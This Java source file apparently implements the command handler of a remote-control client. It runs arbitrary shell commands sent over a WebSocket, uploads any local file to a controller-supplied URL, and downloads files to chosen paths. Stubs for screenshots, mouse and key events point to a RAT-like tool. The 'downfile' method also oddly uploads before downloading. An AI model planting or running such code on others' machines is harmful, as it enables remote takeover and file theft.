package commend;

import connect.WsClient;
import util.FileUploader;
import util.RuntimeUtil;

import static util.DownloadUtils.download;

public class CommandOperImpl implements CommandOper {
    public void cmd(String command) {
        //执行shell命令
        RuntimeUtil.exeCommadn(command.replace("cmd:", "").split(" "));
    }

    public void getfile(String command) {
        //上传文件到服务端
        //getfile:/XXX/XXX/XXX/XXX/XXX.txt:http://www.baodu.com.upload
        String info = command.replace("getfile::", "");
        if (info.contains("::")) {
            String[] infolist = info.split("::");
            if (infolist != null && infolist.length == 2) {
                String filePath = infolist[0];
                String uploadUrl = infolist[1];
                FileUploader.upload(uploadUrl, filePath);
                return;
            }
        }
        WsClient.get().send("格式错误，正确如下\ngetfile::/XXX/XXX.txt::http://www.xxx.com/upload");
    }

    public void downfile(String command) {
        //下载文件到指定目录
        //downfile:/XXX/XXX/XXX/XXX:http://www.baodu.com.upload
        String info = command.replace("downfile::", "");
        if (info.contains("::")) {
            String[] infolist = info.split("::");
            if (infolist != null && infolist.length == 2) {
                String filePath = infolist[0];
                String uploadUrl = infolist[1];
                FileUploader.upload(uploadUrl, filePath);
                download(uploadUrl, filePath);
                return;
            }
        }
        WsClient.get().send("格式错误，正确如下\ndownfile::/XXX/XXX.txt::http://www.xxx.com/xxx.txt|png|...");
    }

    public void opensoft(String command) {

    }

    public void http(String command) {

    }

    public void browser(String command) {

    }

    public void shotscreen(String command) {

    }

    public void mouse(String command) {

    }

    public void keyevent(String command) {

    }


}
